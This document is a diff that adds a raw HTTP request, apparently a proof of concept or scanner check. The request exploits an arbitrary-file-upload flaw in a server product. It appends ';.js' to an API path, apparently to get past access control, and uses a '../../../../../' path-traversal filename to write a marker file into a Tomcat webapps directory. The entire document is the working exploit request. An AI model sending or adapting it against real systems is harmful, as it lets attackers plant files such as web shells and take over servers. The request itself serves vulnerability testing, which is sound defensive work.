@@ -1,0 +1,12 @@
+POST/center/api/files;.jsHTTP/1.1
+Host:x.x.x.x
+User-Agent:python-requests/2.31.0
+Accept-Encoding:gzip,deflate
+Accept:*/*
+Connection:close
+Content-Length:258
+Content-Type:multipart/form-data;boundary=e54e7e5834c8c50e92189959fe7227a4
+--e54e7e5834c8c50e92189959fe7227a4
+Content-Disposition:form-data;name="file";filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/2BT5AV96QW.txt"
+Content-Type:application/octet-stream
+9YPQ3I3ZS
